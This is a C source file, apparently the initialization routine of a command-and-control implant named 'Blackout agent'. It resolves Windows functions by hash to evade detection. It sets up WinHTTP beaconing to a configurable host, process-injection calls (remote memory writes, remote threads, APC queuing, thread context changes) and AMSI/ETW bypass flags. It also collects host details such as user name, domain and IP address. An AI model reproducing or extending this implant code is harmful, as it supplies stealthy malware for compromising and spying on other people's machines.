#include <Common.h>
#include <Utils.h>
#include <Constexpr.h>

#define CONFIG_HOST       L""
#define CONFIG_PORT       0x00
#define CONFIG_USERAGENT  L""
#define CONFIG_SECURE     FALSE
#define CONFIG_WRKHRS     NULL
#define CONFIG_KILLDATE   NULL
#define CONFIG_SLEEP      5

FUNC VOID BlackoutInit() {
    BLACKOUT_INSTANCE

    Instance()->Teb = NtCurrentTeb();

    Instance()->Modules.Kernel32   = LdrModuleAddr( H_MODULE_KERNEL32 );
    Instance()->Modules.Ntdll      = LdrModuleAddr( H_MODULE_NTDLL );

    Instance()->Win32.LoadLibraryA   = LdrFuncAddr( Instance()->Modules.Kernel32, HASH_STR( "LoadLibraryA" ) );
    Instance()->Modules.Winhttp      = Instance()->Win32.LoadLibraryA( "Winhttp.dll"  );
    Instance()->Modules.Advapi32     = Instance()->Win32.LoadLibraryA( "Advapi32.dll" );
    Instance()->Modules.Msvcrt       = Instance()->Win32.LoadLibraryA( "Msvcrt.dll"   );
    Instance()->Modules.Cryptbase    = Instance()->Win32.LoadLibraryA( "Cryptbase.dll" );
    Instance()->Win32.GetProcAddress = LdrFuncAddr( Instance()->Modules.Kernel32, HASH_STR( "GetProcAddress" ) );
    Instance()->Win32.printf         = Instance()->Win32.GetProcAddress( Instance()->Modules.Msvcrt, "printf" );
    Instance()->Modules.Iphlpapi     = Instance()->Win32.LoadLibraryA( "Iphlpapi.dll" );

    Instance()->Win32.GetModuleHandleA          = LdrFuncAddr( Instance()->Modules.Kernel32, HASH_STR( "GetModuleHandleA" ) );
    Instance()->Win32.CreateTimerQueueTimer     = LdrFuncAddr( Instance()->Modules.Kernel32, HASH_STR( "CreateTimerQueueTimer" ) );
    Instance()->Win32.OpenProcess               = LdrFuncAddr( Instance()->Modules.Kernel32, HASH_STR( "OpenProcess" ) );
    Instance()->Win32.OpenThread                = LdrFuncAddr( Instance()->Modules.Kernel32, HASH_STR( "OpenThread" ) );
    Instance()->Win32.CreateProcessA            = LdrFuncAddr( Instance()->Modules.Kernel32, HASH_STR( "CreateProcessA" ) );
    Instance()->Win32.CreateProcessW            = LdrFuncAddr( Instance()->Modules.Kernel32, HASH_STR( "CreateProcessW" ) );
    Instance()->Win32.CreateProcessAsUserA      = LdrFuncAddr( Instance()->Modules.Kernel32, HASH_STR( "CreateProcessAsUserA" ) );
    Instance()->Win32.CreateProcessAsUserW      = LdrFuncAddr( Instance()->Modules.Kernel32, HASH_STR( "CreateProcessAsUserW" ) );
    Instance()->Win32.CreateProcessWithLogonW   = LdrFuncAddr( Instance()->Modules.Kernel32, HASH_STR( "CreateProcessWithLogonW" ) );
    Instance()->Win32.CreateProcessWithTokenW   = LdrFuncAddr( Instance()->Modules.Kernel32, HASH_STR( "CreateProcessWithTokenW" ) );
    Instance()->Win32.WaitForDebugEvent         = LdrFuncAddr( Instance()->Modules.Kernel32, HASH_STR( "WaitForDebugEvent" ) );
    Instance()->Win32.WriteProcessMemory        = LdrFuncAddr( Instance()->Modules.Kernel32, HASH_STR( "WriteProcessMemory" ) );
    Instance()->Win32.DebugActiveProcessStop    = LdrFuncAddr( Instance()->Modules.Kernel32, HASH_STR( "DebugActiveProcessStop" ) );
    Instance()->Win32.ContinueDebugEvent        = LdrFuncAddr( Instance()->Modules.Kernel32, HASH_STR( "ContinueDebugEvent" ) );
    Instance()->Win32.CloseHandle               = LdrFuncAddr( Instance()->Modules.Kernel32, HASH_STR( "CloseHandle" ) );
    Instance()->Win32.GetLastError              = LdrFuncAddr( Instance()->Modules.Kernel32, HASH_STR( "GetLastError" ) );
    Instance()->Win32.LocalAlloc                = LdrFuncAddr( Instance()->Modules.Kernel32, HASH_STR( "LocalAlloc" ) );
    Instance()->Win32.LocalFree                 = LdrFuncAddr( Instance()->Modules.Kernel32, HASH_STR( "LocalFree" ) );
    Instance()->Win32.LocalReAlloc              = LdrFuncAddr( Instance()->Modules.Kernel32, HASH_STR( "LocalReAlloc" ) );
    Instance()->Win32.VirtualFree               = LdrFuncAddr( Instance()->Modules.Kernel32, HASH_STR( "VirtualFree" ) );
    Instance()->Win32.VirtualQuery              = LdrFuncAddr( Instance()->Modules.Kernel32, HASH_STR( "VirtualQuery" ) );
    Instance()->Win32.VirtualAlloc              = LdrFuncAddr( Instance()->Modules.Kernel32, HASH_STR( "VirtualAlloc" ) );
    Instance()->Win32.VirtualAllocEx            = LdrFuncAddr( Instance()->Modules.Kernel32, HASH_STR( "VirtualAllocEx" ) );
    Instance()->Win32.VirtualProtect            = LdrFuncAddr( Instance()->Modules.Kernel32, HASH_STR( "VirtualProtect" ) );
    Instance()->Win32.VirtualProtectEx          = LdrFuncAddr( Instance()->Modules.Kernel32, HASH_STR( "VirtualProtectEx" ) );
    Instance()->Win32.WaitForSingleObject       = LdrFuncAddr( Instance()->Modules.Kernel32, HASH_STR( "WaitForSingleObject" ) );
    Instance()->Win32.WaitForSingleObjectEx     = LdrFuncAddr( Instance()->Modules.Kernel32, HASH_STR( "WaitForSingleObjectEx" ) );
    
    Instance()->Win32.CreateThread              = LdrFuncAddr( Instance()->Modules.Kernel32, HASH_STR( "CreateThread" ) );
    Instance()->Win32.CreateRemoteThread        = LdrFuncAddr( Instance()->Modules.Kernel32, HASH_STR( "CreateRemoteThread" ) );
    Instance()->Win32.QueueUserAPC              = LdrFuncAddr( Instance()->Modules.Kernel32, HASH_STR( "QueueUserAPC" ) ); 
    Instance()->Win32.GetTickCount              = LdrFuncAddr( Instance()->Modules.Kernel32, HASH_STR( "GetTickCount" ) );
    Instance()->Win32.GetComputerNameExA        = LdrFuncAddr( Instance()->Modules.Kernel32, HASH_STR( "GetComputerNameExA" ) );
    Instance()->Win32.TerminateProcess          = LdrFuncAddr( Instance()->Modules.Kernel32, HASH_STR( "TerminateProcess" ) );
    Instance()->Win32.GetProductInfo            = LdrFuncAddr( Instance()->Modules.Kernel32, HASH_STR( "GetProductInfo" ) );
    Instance()->Win32.GetNativeSystemInfo       = LdrFuncAddr( Instance()->Modules.Kernel32, HASH_STR( "GetNativeSystemInfo" )  );

    Instance()->Win32.RtlExitUserProcess        = LdrFuncAddr( Instance()->Modules.Ntdll, HASH_STR( "RtlExitUserProcess" ) );
    Instance()->Win32.RtlExitUserThread         = LdrFuncAddr( Instance()->Modules.Ntdll, HASH_STR( "RtlExitUserThread" ) );
    Instance()->Win32.RtlAllocateHeap           = LdrFuncAddr( Instance()->Modules.Ntdll, HASH_STR( "RtlAllocateHeap" ) );
    Instance()->Win32.RtlReAllocateHeap         = LdrFuncAddr( Instance()->Modules.Ntdll, HASH_STR( "RtlReAllocateHeap" ) );
    Instance()->Win32.RtlFreeHeap               = LdrFuncAddr( Instance()->Modules.Ntdll, HASH_STR( "RtlFreeHeap" ) );

    Instance()->Win32.RtlCreateTimer            = LdrFuncAddr( Instance()->Modules.Ntdll, HASH_STR( "RtlCreateTimer" ) );
    Instance()->Win32.RtlRandomEx               = LdrFuncAddr( Instance()->Modules.Ntdll, HASH_STR( "RtlRandomEx" ) );
    Instance()->Win32.RtlGetVersion             = LdrFuncAddr( Instance()->Modules.Ntdll, HASH_STR( "RtlGetVersion" ));
    Instance()->Win32.RtlIpv6StringToAddressA   = LdrFuncAddr( Instance()->Modules.Ntdll, HASH_STR( "RtlIpv6StringToAddressA" ) );
    Instance()->Win32.NtAllocateVirtualMemory   = LdrFuncAddr( Instance()->Modules.Ntdll, HASH_STR( "NtAllocateVirtualMemory" ) );
    Instance()->Win32.NtProtectVirtualMemory    = LdrFuncAddr( Instance()->Modules.Ntdll, HASH_STR( "NtProtectVirtualMemory" ) );
    Instance()->Win32.NtCreateThreadEx          = LdrFuncAddr( Instance()->Modules.Ntdll, HASH_STR( "NtCreateThreadEx" ) );
    Instance()->Win32.LdrLoadDll                = LdrFuncAddr( Instance()->Modules.Ntdll, HASH_STR( "LdrLoadDll" ) );
    Instance()->Win32.NtQuerySystemInformation  = LdrFuncAddr( Instance()->Modules.Ntdll, HASH_STR( "NtQuerySystemInformation" ) );
    Instance()->Win32.NtAlertResumeThread       = LdrFuncAddr( Instance()->Modules.Ntdll, HASH_STR( "NtAlertResumeThread" ) );
    Instance()->Win32.NtContinue                = LdrFuncAddr( Instance()->Modules.Ntdll, HASH_STR( "NtContinue" ) );
    Instance()->Win32.NtCreateEvent             = LdrFuncAddr( Instance()->Modules.Ntdll, HASH_STR( "NtCreateEvent" ) );
    Instance()->Win32.NtCreateThreadEx          = LdrFuncAddr( Instance()->Modules.Ntdll, HASH_STR( "NtCreateThreadEx" ) );
    Instance()->Win32.NtQueueApcThread          = LdrFuncAddr( Instance()->Modules.Ntdll, HASH_STR( "NtQueueApcThread" ) );
    Instance()->Win32.NtGetContextThread        = LdrFuncAddr( Instance()->Modules.Ntdll, HASH_STR( "NtGetContextThread" ) );
    Instance()->Win32.NtSetContextThread        = LdrFuncAddr( Instance()->Modules.Ntdll, HASH_STR( "NtSetContextThread" ) );
    Instance()->Win32.NtTestAlert               = LdrFuncAddr( Instance()->Modules.Ntdll, HASH_STR( "NtTestAlert" ) );
    Instance()->Win32.NtWaitForSingleObject     = LdrFuncAddr( Instance()->Modules.Ntdll, HASH_STR( "NtWaitForSingleObject" ) );
    Instance()->Win32.NtSignalAndWaitForSingleObject = LdrFuncAddr( Instance()->Modules.Ntdll, HASH_STR( "NtSignalAndWaitForSingleObject" ) );

    Instance()->Win32.GetUserNameA     = LdrFuncAddr( Instance()->Modules.Advapi32, HASH_STR( "GetUserNameA" ) );
    Instance()->Win32.OpenProcessToken = LdrFuncAddr( Instance()->Modules.Advapi32, HASH_STR( "OpenProcessToken" ) );
    Instance()->Win32.OpenThreadToken  = LdrFuncAddr( Instance()->Modules.Advapi32, HASH_STR( "OpenThreadToken" ) );

    Instance()->Win32.WinHttpOpen               = LdrFuncAddr( Instance()->Modules.Winhttp, HASH_STR( "WinHttpOpen" ) );
    Instance()->Win32.WinHttpConnect            = LdrFuncAddr( Instance()->Modules.Winhttp, HASH_STR( "WinHttpConnect" ) );
    Instance()->Win32.WinHttpOpenRequest        = LdrFuncAddr( Instance()->Modules.Winhttp, HASH_STR( "WinHttpOpenRequest" ) );
    Instance()->Win32.WinHttpReceiveResponse    = LdrFuncAddr( Instance()->Modules.Winhttp, HASH_STR( "WinHttpReceiveResponse" ) );
    Instance()->Win32.WinHttpSendRequest        = LdrFuncAddr( Instance()->Modules.Winhttp, HASH_STR( "WinHttpSendRequest" ) );
    Instance()->Win32.WinHttpReadData           = LdrFuncAddr( Instance()->Modules.Winhttp, HASH_STR( "WinHttpReadData" ) );
    Instance()->Win32.WinHttpSetOption          = LdrFuncAddr( Instance()->Modules.Winhttp, HASH_STR( "WinHttpSetOption") );
    Instance()->Win32.WinHttpCloseHandle        = LdrFuncAddr( Instance()->Modules.Winhttp, HASH_STR( "WinHttpCloseHandle" ) );

    Instance()->Win32.SystemFunction040 = LdrFuncAddr( Instance()->Modules.Cryptbase, HASH_STR( "SystemFunction040" ) );
    Instance()->Win32.SystemFunction041 = LdrFuncAddr( Instance()->Modules.Cryptbase, HASH_STR( "SystemFunction041" ) );

    Instance()->Win32.printf = Instance()->Win32.GetProcAddress( Instance()->Modules.Msvcrt, "printf" );

    Instance()->Win32.GetAdaptersInfo = LdrFuncAddr( Instance()->Modules.Iphlpapi, HASH_STR( "GetAdaptersInfo" ) );
    //Instance()->Config.Session.AgentId    = RandomNumber32();
    Instance()->Config.Session.AmsiBypass = FALSE;
    Instance()->Config.Session.EtwBypass  = FALSE;
    Instance()->Config.Session.Heap       = Instance()->Teb->ProcessEnvironmentBlock->ProcessHeap;
    Instance()->Config.Session.ProcessId  = CST_U32( Instance()->Teb->ClientId.UniqueProcess );
    Instance()->Config.Session.ThreadId   = CST_U32( Instance()->Teb->ClientId.UniqueThread );
        
    MEMORY_BASIC_INFORMATION Mbi = { 0 };
    Instance()->Win32.VirtualQuery( Instance()->Base.Buffer, &Mbi, sizeof( Mbi ) );

    Instance()->Win32.printf( "[I] AllocationBase 0x%p\n[I] AllocationProtection %x\n[I] RegionSize %ld\n[I] Type %x\n[I] Base address 0x%p\n[I] Protection %x\n\n", 
    Mbi.AllocationBase, Mbi.AllocationProtect, Mbi.RegionSize, Mbi.Type, Mbi.BaseAddress, Mbi.Protect );

    GetProcessInfo( 
        &Instance()->Config.Session.ProcessFullPath, 
        &Instance()->Config.Session.ProcessName, 
        &Instance()->Config.Session.ProcessCmdLine 
    );

    GetComputerInfo( 
        &Instance()->Config.CompData.OsArch,
        &Instance()->Config.CompData.ProcessorType,
        &Instance()->Config.CompData.ProductType,
        &Instance()->Config.CompData.IpAddress
    );


    Instance()->Config.CompData.OsMajorV        = Instance()->Teb->ProcessEnvironmentBlock->OSMajorVersion;
    Instance()->Config.CompData.OsMinorv        = Instance()->Teb->ProcessEnvironmentBlock->OSMajorVersion;
    Instance()->Config.CompData.OsBuildNumber   = Instance()->Teb->ProcessEnvironmentBlock->OSBuildNumber;

    Instance()->Config.CompData.OsArch        = 0;
    Instance()->Config.CompData.ProcessorType = 0;
    
    Instance()->Config.Session.SleepTime  = CONFIG_SLEEP;
    Instance()->Config.Session.Jitter     = 0x00;

    Instance()->Config.TransportWeb.Host      = CONFIG_HOST;
    Instance()->Config.TransportWeb.Port      = CONFIG_PORT;
    Instance()->Config.TransportWeb.UserAgent = CONFIG_USERAGENT;
    Instance()->Config.TransportWeb.Secure    = CONFIG_SECURE;

    Instance()->Config.Session.WorkingHours = CONFIG_WRKHRS;
    Instance()->Config.Session.KillDate     = CONFIG_KILLDATE;

    Instance()->Win32.printf( 
        "[INFO] Blackout agent initialized @ 0x%p [%d bytes]\n"
        "[INFO] Blackout Rx Base @ 0x%p [%d bytes]\n"
        "\t=> Process Heap @ 0x%p\n"
        "\t=> ProcessId: %d\n"
        "\t=> ThreadId:  %d\n"
        "\t=> Sleeptime: %d\n"
        "\t=> Version: %d.%d.%d\n"
        "\t=> Hostname:  %s\n"
        "\t=> NetBios: %s\n"
        "\t=> Domain Name: %s\n"
        "\t=> Ip Adress: %s\n"
        "\t=> User Name: %s\n"
        "\t=> Process architecture: %d\n"
        "\t=> Product Type: %d\n"
        "\t=> Processor type: %d\n"
        "\t=> Process name: %ws\n"
        "\t=> Process full path: %ws\n"
        "\t=> Process CmdLine: %ws\n",
        Instance()->Base.Buffer,
        Instance()->Base.Length,
        Instance()->Base.RxBase,
        Instance()->Base.RxSize,
        Instance()->Config.Session.Heap, 
        Instance()->Config.Session.ProcessId,
        Instance()->Config.Session.ThreadId,
        Instance()->Config.Session.SleepTime,
        Instance()->Config.CompData.OsMajorV, Instance()->Config.CompData.OsMinorv, Instance()->Config.CompData.OsBuildNumber,
        Instance()->Config.CompData.ComputerName,
        Instance()->Config.CompData.NetBios,
        Instance()->Config.CompData.DomainName,
        Instance()->Config.CompData.IpAddress,
        Instance()->Config.CompData.UserName,
        Instance()->Config.CompData.OsArch,
        Instance()->Config.CompData.ProductType,
        Instance()->Config.CompData.ProcessorType,
        Instance()->Config.Session.ProcessName,
        Instance()->Config.Session.ProcessFullPath,
        Instance()->Config.Session.ProcessCmdLine
    );           
}